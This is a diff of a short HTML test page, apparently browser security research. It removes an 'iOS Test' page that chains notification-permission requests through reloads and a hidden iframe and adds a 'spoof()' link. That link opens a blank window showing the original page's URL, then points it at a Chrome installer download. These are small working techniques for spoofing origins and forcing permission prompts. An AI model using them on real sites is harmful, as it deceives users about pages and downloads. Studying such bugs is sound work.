@@ -1,73 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>iOS Test</title>
-</head>
-<body>
-
-<button id="start">Start iOS Test</button>
-
 <script>
-function addIframe(src) {
-  const iframe = document.createElement("iframe");
-  iframe.src = src;
-  iframe.style.display = "none";
-  return iframe;
-}
-
-async function requestNotificationIOS() {
-  if (!("Notification" in window)) return;
-  await Notification.requestPermission();
-}
-
-async function requestClipboardIOS() {
-  try {
-    await navigator.clipboard.writeText("test");
-  } catch (e) {
-    console.log("Clipboard blocked on iOS");
-  }
-}
-
-function testIOS() {
-  if (sessionStorage.getItem("key") === "1") {
-    sessionStorage.removeItem("key");
-
-    requestNotificationIOS();
-
-    const iframe = addIframe(location.href + "#child");
-    iframe.onload = () => {
-      // iOS: no permission spam, single call only
-      requestNotificationIOS();
-
-      setTimeout(() => {
-        iframe.remove();
-
-        setTimeout(() => {
-          // Clipboard write (allowed with gesture chain)
-          requestClipboardIOS();
-        }, 1000);
-      }, 500);
-    };
-
-    document.body.appendChild(iframe);
-
-  } else {
-    sessionStorage.setItem("key", "1");
-    requestNotificationIOS();
-
-    setTimeout(() => {
-      location.reload();
-    }, 300);
-  }
-}
-
-document.getElementById("start").addEventListener("click", () => {
-  if (location.hash !== "#child") {
-    testIOS();
-  }
-});
+    function spoof() {
+        var w = open()
+        w.opener = null
+        w.document.write('Current URL: ' + document.URL)
+        w.location = 'https://dl.google.com/linux/direct/google-chrome-stable_current_i386.deb'
+    }
 </script>
-
-</body>
-</html>
+<a href='JavaScript:spoof()'>Download Chrome</a>
